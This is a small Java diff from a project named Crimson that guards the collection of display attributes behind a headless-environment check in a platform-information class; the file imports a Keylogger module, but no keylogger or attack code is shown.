@@ -18,6 +18,8 @@
 
 package com.subterranean_security.crimson.core.platform;
 
+import java.awt.GraphicsEnvironment;
+
 import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.core.Common;
@@ -89,8 +91,11 @@ public final class Platform {
 		}
 
 		info.addAllGroupAttr(CPU.getAttributes());
-		info.addAllGroupAttr(DISP.getAttributes());
 		info.addAllGroupAttr(NIC.getAttributes());
+
+		if (!GraphicsEnvironment.isHeadless()) {
+			info.addAllGroupAttr(DISP.getAttributes());
+		}
 
 		return info.build();
 	}
